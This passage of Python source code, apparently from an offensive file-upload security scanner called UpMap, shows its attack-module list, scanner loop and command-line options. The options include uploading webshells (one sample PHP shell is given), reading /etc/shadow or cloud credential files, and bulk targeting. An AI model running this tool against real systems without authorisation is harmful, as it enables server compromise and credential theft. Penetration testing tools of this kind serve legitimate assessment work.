    ("XSS", [
        "xss_svg",              # SVG XSS — extremely common
        "xss_html",
        "xss_polyglot",
        "swf_xss",
    ]),
    ("SSRF", [
        "ssrf_url",
        "url_file_ssrf",
        "svg_ssrf",
    ]),
    ("ESI", [
        "esi_injection",        # Edge-Side Includes (Squid/Varnish/Nginx)
    ]),
    ("Image / Media CVEs", [
        "imagetragick_sleep",
        "imagetragick_oast",
        "imagemagick_mvg",
        "ghostscript",
        "libavformat_ssrf",
        "polyglot_image_rce",
    ]),
    ("PDF", [
        "pdf_exploit",
    ]),
    ("Archive / ZIP", [
        "zip_traversal",
        # "zip_split_obfuscation",  # disabled — Caesar/base64 split-ZIP AV evasion
    ]),
    ("Recon / Fingerprint", [
        "eicar_detection",
        "fingerping",
        "known_cve_endpoints",
    ]),
    ("Fuzzing / DoS", [
        "wordlist_fuzzer",
        "content_fuzzer",
        "dos_crashfiles",        # heaviest/noisiest — always last
    ]),
]

ALL_MODULES_ORDERED = [m for _label, mods in MODULE_GROUPS for m in mods]


def run_scanner(opts, targets: list, interrupt_event=None):
    """Main scanner loop — handles single or bulk targets."""
    output = OutputManager(opts.output, getattr(opts, "report_format", None),
                           success_regex=opts.success_regex)
    if getattr(opts, "shell_sources", None):
        output.payload_label = ", ".join(sorted(set(opts.shell_sources.values())))

    for target_url in targets:
        if interrupt_event is not None and interrupt_event.is_set():
            break
        # Per-target state: resume file tracks progress per-target via URL-keyed path
        resume_path = opts.resume
        if resume_path and len(targets) > 1:
            safe = re.sub(r"[^\w]", "_", target_url)[:40]
            resume_path = opts.resume + "." + safe
        state = StateManager(resume_path).load() if resume_path else StateManager(None)

        # Always update target URL for each iteration (fixes multi-target URL stale bug)
        if target_url:
            opts.url = target_url

        engine = HttpEngine(opts)
        ctx    = UploadContext(engine, opts, output, interrupt_event=interrupt_event)

        # Resolve the upload transport before any request is sent (recon below
        # uses ctx.send too). Drives both body construction and module pruning.
        opts.transport = detect_transport(opts, ctx.req_info)

        info(f"Target: {ctx.upload_url}")
        if opts.transport != "request-file":
            info(f"Upload method: {opts.transport}"
                 + (f" (verb {resolve_verb(opts)})"
                    if opts.transport in ("raw", "template") else ""))

        # Form auto-detect if no request file and no field provided
        if not opts.request_file and not opts.field and BS4:
            form = detect_upload_form(ctx.upload_url, engine.session)
            if form:
                ctx.upload_url = form["action_url"]
                ctx.field      = form["field"]
                success(f"Upload form: field={ctx.field} action={ctx.upload_url}")

        # Prime CSRF tokens before recon so detection requests carry them too.
        ctx.refresh_csrf()

        # Auto-detect allowed extension (unless -A given or --skip-recon set)
        auto_allowed = not opts.allowed
        if auto_allowed:
            if opts.skip_recon:
                opts.allowed = "jpg"
                warn("Recon skipped (--skip-recon) — defaulting allowed extension to jpg")
            else:
                opts.allowed = detect_allowed_extension(ctx)

        # SVG canary (folded into recon): confirm .svg is accepted + how it is
        # served before the SVG attack modules fire. Independent of which allowed
        # extension auto-detection picked above. Skipped with --skip-recon.
        if not opts.skip_recon and not ctx._should_abort():
            svg_canary_recon(ctx)

        # Baseline fingerprint
        ctx.fingerprint_baseline()

        # Build module list. Explicit -m is honored verbatim (no auto routing);
        # default / -x runs follow the most-known order from MODULE_GROUPS.
        explicit_modules = bool(opts.modules)
        if opts.modules:
            requested = [m.strip() for m in opts.modules.split(",")]
            unknown   = [m for m in requested if m not in MODULES]
            if unknown:
                warn(f"Unknown module(s) ignored: {', '.join(unknown)}")
            run_list  = [m for m in requested if m in MODULES]
            if not run_list:
                err("No valid modules in -m list — check spelling or run --list")
                continue
        elif opts.exclude:
            excl     = [m.strip() for m in opts.exclude.split(",")]
            run_list = [m for m in ALL_MODULES_ORDERED if m not in excl]
        else:
            run_list = list(ALL_MODULES_ORDERED)

        # Route to the -E target language: drop code-exec modules for other
        # languages (e.g. -E asp → asp_rce + web.config, not php/jsp/cgi RCE).
        # Skipped when modules are named explicitly (-m) so the user's choice wins.
        if not explicit_modules:
            run_list, lang_skipped = apply_language_filter(run_list, opts)
            if lang_skipped:
                info(f"-E {opts.extension} (lang={target_lang(opts.extension)}) → "
                     f"{len(lang_skipped)} other-language module(s) skipped: "
                     f"{', '.join(lang_skipped)}")

        # Filter already-done modules (resume)
        pending = [m for m in run_list if not state.is_done(m)]

        # Prune modules with 0% probability in the resolved transport, e.g.
        # mime_spoofing when there is no per-file Content-Type, or the binary
        # CVEs when the body is text-only JSON. Disabled by --no-method-filter.
        caps             = transport_caps(opts)
        pending, skipped = apply_method_filter(pending, caps, opts)
        if skipped:
            by_reason = {}
            for m, missing in skipped.items():
                reason = ", ".join(_CAP_REASON.get(c, c) for c in sorted(missing))
                by_reason.setdefault(reason, []).append(m)
            warn(f"method={opts.transport} → {len(skipped)} module(s) skipped "
                 f"(0% probability in this transport):")
            for reason, mods in by_reason.items():
                info(f"  [{reason}] {', '.join(sorted(mods))}")
            info("  (override with --no-method-filter)")

        # Progress is module-based (exact) — one unit per module that will run.
        output.set_total(len(pending))

        print(f"\n  {C}Modules to run: {len(pending)}{RS}\n")

        if opts.threads > 1:
            # Threaded execution — modules in parallel.
            # Manually manage the executor (no `with`) so shutdown(wait=True) in the
            # context-manager __exit__ can't block while worker threads finish long
            # in-flight requests after a Ctrl+C.
            futures     = {}
            interrupted = False
            ex = concurrent.futures.ThreadPoolExecutor(max_workers=opts.threads)
            try:
                futures = {
                    ex.submit(MODULES[m], ctx): m
                    for m in pending if not ctx.stop_flag.is_set()
                }
                for fut in concurrent.futures.as_completed(futures):
                    mod_name = futures[fut]
                    try:
                        fut.result()
                        state.mark_done(mod_name)
                    except Exception as e:
                        if opts.debug:
                            traceback.print_exc()
                        else:
                            err(f"{mod_name}: {e}")
                    finally:
                        output.advance(mod_name)
                    # User interrupt: stop dispatching new work immediately.
                    if interrupt_event is not None and interrupt_event.is_set():
                        ctx.stop_flag.set()
                        interrupted = True
                        break
                    if ctx._aborted:        # host down — cancel queued modules
                        for f in futures:
                            f.cancel()
                        break
            except KeyboardInterrupt:
                # Fallback if the signal handler wasn't installed (e.g. early import).
                ctx.stop_flag.set()
                if interrupt_event is not None:
                    interrupt_event.set()
                interrupted = True
            finally:
                # Cancel queued futures and return without waiting for workers.
                # Workers check interrupt_event and exit after their current send.
                # Suppress KI here: the watchdog may schedule it at any point and
                # we don't want it to abort the shutdown bookkeeping.
                try:
                    if sys.version_info >= (3, 9):
                        ex.shutdown(wait=False, cancel_futures=True)
                    else:
                        for f in futures:
                            f.cancel()
                        ex.shutdown(wait=False)
                except KeyboardInterrupt:
                    pass
            if interrupted:
                print()
                warn("Scan interrupted — saving state")
                state.save()
        else:
            # Sequential execution
            for mod_name in pending:
                if (interrupt_event is not None and interrupt_event.is_set()) \
                        or ctx._aborted:
                    break
                if ctx.stop_flag.is_set() and not opts.brute_force:
                    break
                info(f"Running: {mod_name}")
                try:
                    MODULES[mod_name](ctx)
                    state.mark_done(mod_name)
                except KeyboardInterrupt:
                    warn("Interrupted — saving state")
                    state.save()
                    break
                except Exception as e:
                    if opts.debug:
                        traceback.print_exc()
                    else:
                        err(f"{mod_name}: {e}")
                output.advance(mod_name)

        opts.url = None  # reset for next target
        if auto_allowed:
            opts.allowed = None  # re-detect per target (servers may differ)

    output.summary()

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 17 — CLI
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="UpMap.py",
        description="Unified File Upload Security Assessment Tool",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"Available modules: {', '.join(ALL_MODULES_ORDERED)}"
    )

    # ── Target ────────────────────────────────────────────────────────────────
    tgt = p.add_argument_group("Target")
    tgt.add_argument("-u", "--url",          dest="url",          default=None,
                     help="Target URL with upload form")
    tgt.add_argument("--targets",            dest="targets_file", default=None,
                     help="File containing multiple target URLs (one per line)")
    tgt.add_argument("-r", "--request-file", dest="request_file", default=None,
                     help="Burp raw HTTP request file (markers: §FILENAME§ §CONTENT§ §MIMETYPE§)")
    tgt.add_argument("--field",              dest="field",        default=None,
                     help="File input field name (for -u mode, e.g. 'file')")

    # ── Detection ─────────────────────────────────────────────────────────────
    det = p.add_argument_group("Detection")
    det.add_argument("-s", "--success",       dest="success_regex",  default=None,
                     help="Regex matching successful upload response")
    det.add_argument("-f", "--failure",       dest="failure_regex",  default=None,
                     help="Regex matching failed upload response")
    det.add_argument("-S", "--status-code",   dest="status_code",    type=int, default=200,
                     help="HTTP status code for success (default: 200)")
    det.add_argument("-D", "--upload-dir",    dest="upload_dir",     default=None,
                     help="Remote path where uploads are stored (for RCE verification)")

    # ── Extension ─────────────────────────────────────────────────────────────
    ext = p.add_argument_group("Extension")
    ext.add_argument("-E", "--extension",    dest="extension",  default="php",
                     help="Backend extension to attack (php/asp/jsp/coldfusion/perl, default: php)")
    ext.add_argument("-A", "--allowed",      dest="allowed",    default=None,
                     help="Allowed extension (auto-detected if not set, e.g. jpg)")
    ext.add_argument("--shell",              dest="shell",      action="append", default=None,
                     metavar="[LANG=]PATH",
                     help="Custom RAW shell file used instead of the built-in payload for the\n"
                          "code-execution modules. Repeatable. Forms:\n"
                          "  --shell shell.php            (applies to the -E extension)\n"
                          "  --shell asp=shell.asp --shell aspx=shell.aspx  (per language)\n"
                          "LANG = php/asp/aspx/jsp/perl/py/rb/cfm. Provide a plain shell\n"
                          "(e.g. <?php system($_GET['cmd']);?>); UpMap builds the polyglots.")
    ext.add_argument("--cmd-param",          dest="cmd_param",  default="cmd",
                     metavar="NAME",
                     help="Query parameter verify_exec uses to trigger the uploaded shell\n"
                          "(default: cmd). Set this to match a custom --shell that reads its\n"
                          "command from a different parameter, e.g.\n"
                          "  --shell s.php --cmd-param x   for  <?php system($_GET['x']);?>")
    ext.add_argument("--file-read",          dest="file_read",  default=None,
                     metavar="PATH",
                     help="Override the local-file target in every LFI-bearing payload\n"
                          "(XXE file://, php://filter, xi:include, esi:include, ssi #include,\n"
                          "ssrf file://, ghostscript .libfile). Accepts either a literal path\n"
                          "(/proc/self/environ, /c:/inetpub/wwwroot/web.config) OR an\n"
                          "@key.path lookup into the embedded paths.json registry, e.g.\n"
                          "  @linux.credentials       (resolves to /etc/shadow first)\n"
                          "  @windows.iis             (resolves to web.config first)\n"
                          "  @devops_cloud.aws        (resolves to ~/.aws/credentials first)\n"
                          "When @key resolves to multiple leaves the FIRST wins; for fan-out\n"
                          "across a whole category use Upname (wordlist-shaped).\n"
                          "Unset = each payload keeps its hardcoded default (/etc/passwd,\n"
                          "win.ini, /etc/hostname, c:/boot.ini, ...). Note: known_cve_endpoints\n"
                          "Struts PoC keeps its 'index' target intact (public PoC verbatim).")

    # ── Upload Method / Transport ───────────────────────────────────────────────
    um = p.add_argument_group("Upload Method")
    um.add_argument("--method", dest="upload_method", default="auto",
                    choices=["auto", "multipart", "raw", "json-b64", "json-raw",
                             "xml-b64", "form-b64", "template"],
                    help="Upload body transport (default: auto).\n"
                         "  multipart : multipart/form-data (classic, default for -u)\n"
                         "  raw       : raw body, filename in URL path (PUT, WebDAV-style)\n"
                         "  json-b64  : {\"filename\":..,\"<field>\":\"<base64>\"}\n"
                         "  json-raw  : {\"filename\":..,\"<field>\":\"<text>\"}  (text-only)\n"
                         "  xml-b64   : <upload><filename>..</filename><field>b64</field></upload>\n"
                         "  form-b64  : urlencoded  filename=..&<field>=<base64>\n"
                         "  template  : custom body via --body-template\n"
                         "auto resolves to multipart for -u (raw if URL has {{FILENAME}}).")
    um.add_argument("--body-template", dest="body_template", default=None,
                    metavar="TEXT|@FILE",
                    help="Custom request body (implies --method template). Placeholders:\n"
                         "  {{FILENAME}} {{FILE_B64}} {{FILE_RAW}} {{MIME}} {{FIELD}}\n"
                         "Use @path to read the template from a file. May also appear in -u URL.")
    um.add_argument("--content-type", dest="content_type", default=None,
                    help="Request Content-Type for raw/template transports\n"
                         "(default: file MIME for raw, application/octet-stream for template)")
    um.add_argument("--method-verb", dest="method_verb", default=None,
                    choices=["POST", "PUT", "PATCH"],
                    help="HTTP verb for raw/template (default: PUT for raw, POST otherwise)")
    um.add_argument("--no-method-filter", dest="no_method_filter", action="store_true",
                    help="Do NOT skip modules with 0%% probability in the chosen transport\n"
                         "(by default e.g. mime_spoofing is skipped when there is no per-file MIME)")

    # ── Modules ───────────────────────────────────────────────────────────────
    mod = p.add_argument_group("Modules")
    mod.add_argument("-m", "--modules",      dest="modules",     default=None,
                     help="Comma-separated list of modules to run (default: all)")
    mod.add_argument("-x", "--exclude",      dest="exclude",     default=None,
                     help="Comma-separated modules to skip")
    mod.add_argument("-l", "--list",         dest="list_modules",action="store_true",
                     help="List all available modules and exit")
    mod.add_argument("--skip-recon",         dest="skip_recon",  action="store_true",
                     help="Skip allowed extension auto-detection")
    mod.add_argument("-c", "--brute-force",  dest="brute_force", action="store_true",
                     help="Continue after first finding (don't stop)")

    # ── HTTP ──────────────────────────────────────────────────────────────────
    http = p.add_argument_group("HTTP")
    http.add_argument("-p", "--proxy",       dest="proxy",       default=None,
                      help="Proxy URL (e.g. http://127.0.0.1:8080)")
    http.add_argument("--scheme",            dest="scheme",      default="https",
                      choices=["http", "https"],
                      help="Scheme for -r request-file targets (default: https)")
    http.add_argument("-k", "--insecure",    dest="insecure",    action="store_true",
                      help="No-op: UpMap never verifies TLS. Kept for CLI compatibility.")
    http.add_argument("--cookies",           dest="cookies",     default=None,
                      help="Cookies: 'PHPSESSID=abc; other=val'")
    http.add_argument("-d", "--data",        dest="extra_data",  default=None,
                      help="Extra POST data: 'csrf=token&other=val'")
    http.add_argument("-U", "--user-agent",  dest="user_agent",  default=None,
                      help="Custom User-Agent string")
    http.add_argument("--random-ua",         dest="random_ua",   action="store_true",
                      help="Rotate User-Agent randomly per request")
    http.add_argument("-rl", "--rate-limit", dest="rate_limit",  type=int, default=0,
                      help="Milliseconds between requests (default: 0 = unlimited)")
    http.add_argument("-t", "--timeout",     dest="timeout",     type=int, default=15,
                      help="Request timeout in seconds (default: 15)")
    http.add_argument("--retries",           dest="retries",     type=int, default=3,
                      help="Retries on connection/timeout/rate-limit errors,\n"
                           "with exponential backoff (default: 3)")
    http.add_argument("--allow-redirects",   dest="allow_redirects", action="store_true",
                      help="Follow HTTP redirects (default: False)")
    http.add_argument("--csrf-url",          dest="csrf_url",    default=None,
                      help="Page to scrape CSRF tokens from (default: the target page).\n"
                           "Tokens are auto-detected and refreshed on token errors.")
    http.add_argument("--no-csrf-auto",      dest="no_csrf_auto", action="store_true",
                      help="Disable automatic CSRF token detection/refresh\n"
                           "(on by default; field tokens are scraped from hidden\n"
                           "inputs/meta, then re-fetched on 419/token errors. With -r,\n"
                           "captured request headers are replayed verbatim.)")
    http.add_argument("--csrf-header",       dest="csrf_headers_map", action="append",
                      metavar="NAME=COOKIE", default=[],
                      help="Echo a double-submit token into request header NAME, taking\n"
                           "its value from cookie COOKIE (repeatable). Explicit — no\n"
                           "framework guessing. e.g. --csrf-header X-XSRF-TOKEN=XSRF-TOKEN")
    http.add_argument("--csrf-refresh",      dest="csrf_refresh", action="store_true",
                      help="Keep double-submit CSRF headers in sync with rotating\n"
                           "cookies: auto-detect from a -r capture which request header\n"
                           "mirrors a cookie value and re-send it from the current\n"
                           "cookie on each refresh (evidence-based, off by default).")
    http.add_argument("-P", "--put",         dest="method",      action="store_const",
                      const="PUT",  default="POST",
                      help="Use PUT method for uploads")
    http.add_argument("-Pa", "--patch",      dest="method",      action="store_const",
                      const="PATCH",
                      help="Use PATCH method for uploads")

    # ── OAST / Collaborator ───────────────────────────────────────────────────
    oast = p.add_argument_group("OAST / Out-of-Band")
    oast.add_argument("--oast",              dest="oast",        default=None,
                      help="OAST/Collaborator URL (interactsh, Burp Collaborator, etc.)")

    # ── Performance ───────────────────────────────────────────────────────────
    perf = p.add_argument_group("Performance")
    perf.add_argument("-T", "--threads",     dest="threads",     type=int,  default=1,
                      help="Number of concurrent threads (default: 1)")
    perf.add_argument("--fuzz-count",        dest="fuzz_count",  type=int,  default=10,
                      help="Random mutations per fuzzer run (default: 10)")

    # ── Output ────────────────────────────────────────────────────────────────
    out = p.add_argument_group("Output")
    out.add_argument("-o", "--output",       dest="output",      default=None,
                     help="Write findings report to this file. Format is inferred\n"
                          "from the extension (.txt/.csv/.json) unless --format is set.")
    out.add_argument("-F", "--format",       dest="report_format",
                     choices=["txt", "csv", "json"], default=None,
                     help="Report format for -o (default: infer from extension, else json)")
    out.add_argument("--resume",             dest="resume",      default=None,
                     help="Resume from state file (JSON)")
    out.add_argument("--debug",              dest="debug",       action="store_true",
                     help="Print full stack traces on errors")
    out.add_argument("-R", "--response",     dest="show_response",action="store_true",
                     help="Print full HTTP response body per request")
    out.add_argument("--version",            action="version",
                     version=f"UpMap.py {__version__}")

    return p


# Maps a --shell LANG token to the SHELLS key the modules look up.
SHELL_LANG_KEYS = {
    "php": "php", "asp": "asp", "aspx": "aspx", "jsp": "jsp",
    "perl": "perl", "pl": "pl", "py": "py", "python": "py",
    "rb": "rb", "ruby": "rb", "cfm": "coldfusion", "coldfusion": "coldfusion",
}


def load_custom_shells(opts) -> dict:
    """Load --shell files and override the built-in SHELLS payloads in place.

    A plain `--shell PATH` applies to the -E extension; `--shell LANG=PATH`
    targets a specific language. Returns {shells_key: basename} for finding
    attribution. Exits on a bad language token or missing file.
    """
    sources = {}
    if not opts.shell:
        return sources
    for spec in opts.shell:
        # "LANG=PATH" form (only when the literal spec isn't itself a real file)
        if "=" in spec and not os.path.isfile(spec):
            lang, _, path = spec.partition("=")
            key = SHELL_LANG_KEYS.get(lang.strip().lower())
            if not key:
                err(f"--shell: unknown language '{lang.strip()}' "
                    f"(use php/asp/aspx/jsp/perl/py/rb/cfm)")
                sys.exit(1)
        else:
            path = spec
            key  = SHELL_LANG_KEYS.get(opts.extension, opts.extension)
        if not os.path.isfile(path):
            err(f"--shell: file not found: {path}")
            sys.exit(1)
        with open(path, "rb") as f:
            data = f.read()
        SHELLS[key] = data          # in-place override seen by every module
        sources[key] = os.path.basename(path)
        success(f"Custom shell loaded: {os.path.basename(path)} "
                f"-> SHELLS[{key}] ({len(data)} bytes)")
    return sources


def main():
    parser = build_parser()
    opts   = parser.parse_args()

    if opts.list_modules:
        banner()
        total = len(ALL_MODULES_ORDERED)
        divider = f"  {C}{'─' * 60}{RS}"
        print(f"  {W}{BLD}ATTACK MODULES  {DG}({total} total, ordered by prevalence){RS}")
        print(divider)
        # Driven by MODULE_GROUPS so labels always match the real run order.
        i = 0
        for g_label, mods in MODULE_GROUPS:
            print(f"\n  {OR}{BLD}  {g_label}{RS}")
            for m in mods:
                i += 1
                lang = MODULE_LANG.get(m)
                tag  = f"  {DG}[{lang}]{RS}" if lang else ""
                print(f"  {DG}  {i:2d}.{RS}  {C}{m}{RS}{tag}")
        print(f"\n{divider}\n")
        sys.exit(0)

    # C3: refuse a directory --file-read (literal or @key resolving to a dir).
    # Multi-leaf @key results are already dir-filtered by the resolver.
    _validate_file_read_or_die(opts.file_read, parser.error)

    if not opts.url and not opts.request_file and not opts.targets_file:
        parser.error("Provide -u URL, -r request.txt, or --targets file.txt")

    if not opts.success_regex and not opts.failure_regex and opts.status_code == 200:
        warn("No success/failure regex set — using HTTP 200 as success indicator")

    # Resolve --body-template (@file form) and validate transport options.
    if opts.body_template and opts.body_template.startswith("@"):
        tpath = opts.body_template[1:]
        if not os.path.isfile(tpath):
            parser.error(f"--body-template file not found: {tpath}")
        with open(tpath, "r", encoding="utf-8") as f:
            opts.body_template = f.read()
    if opts.upload_method == "template" and not opts.body_template:
        parser.error("--method template requires --body-template")

    # Build target list
    targets = []
    if opts.targets_file:
        try:
            with open(opts.targets_file) as f:
                targets = [line.strip() for line in f if line.strip()]
        except OSError as e:
            parser.error(f"--targets: cannot read {opts.targets_file}: {e}")
        if not targets:
            parser.error(f"--targets: {opts.targets_file} is empty")
    elif opts.url:
        targets = [opts.url]
    else:
        targets = [None]  # use request_file URL

    banner()
    info(f"Targets: {len(targets)} | Threads: {opts.threads} | Extension: {opts.extension}")
    info(f"OAST: {opts.oast or 'not set (sleep-based fallback for relevant modules)'}")
    info(f"Proxy: {opts.proxy or 'none'} | Rate limit: {opts.rate_limit}ms")
    opts.shell_sources = load_custom_shells(opts)
    if opts.shell_sources:
        info(f"Custom shells: " +
             ", ".join(f"{k}={v}" for k, v in opts.shell_sources.items()))
    if getattr(opts, "cmd_param", "cmd") != "cmd":
        info(f"Shell command parameter: {opts.cmd_param}")
    print()

    # Two-stage Ctrl+C: first press = graceful cooperative stop (workers finish
    # their current in-flight request then exit); second press = os._exit(130)
    # which forcibly terminates the process regardless of live threads.
    _interrupt_count = [0]
    interrupt_event  = threading.Event()

    def _sigint_handler(signum, frame):
        _interrupt_count[0] += 1
        if _interrupt_count[0] >= 2:
            print(f"\n  {R}{BLD}Force quit.{RS}", flush=True)
            os._exit(130)
        interrupt_event.set()
        print(f"\n  {Y}{BLD}[!]{RS} {Y}Stopping… "
              f"(Ctrl+C again to force-quit){RS}", flush=True)

    def _interrupt_watchdog():
        """Waits for the interrupt event, then schedules a KeyboardInterrupt in
        the main thread so any blocking C-level I/O (socket.recv, select, sleep)
        is woken up within ~100 ms instead of waiting for the full request timeout."""
        import _thread
        interrupt_event.wait()      # blocks until first Ctrl+C
        _thread.interrupt_main()    # raises KeyboardInterrupt in the main thread

    threading.Thread(target=_interrupt_watchdog, daemon=True).start()
    signal.signal(signal.SIGINT, _sigint_handler)

    try:
        run_scanner(opts, targets, interrupt_event)
    except KeyboardInterrupt:
        # Fallback: only reached if the signal handler wasn't active (e.g. early
        # interrupt before handler installed, or programmatic raise).
        print()
        warn("Interrupted by user")
        sys.exit(0)
    except RequestException as e:
        err(f"Network error: {e}")
        sys.exit(2)
    except OSError as e:
        err(f"File/OS error: {e}")
        sys.exit(2)
    except Exception as e:
        # Last-resort guard: never dump a raw traceback unless --debug.
        if getattr(opts, "debug", False):
            traceback.print_exc()
        else:
            err(f"Unexpected error: {e} (run with --debug for the full trace)")
        sys.exit(2)


if __name__ == "__main__":
    main()
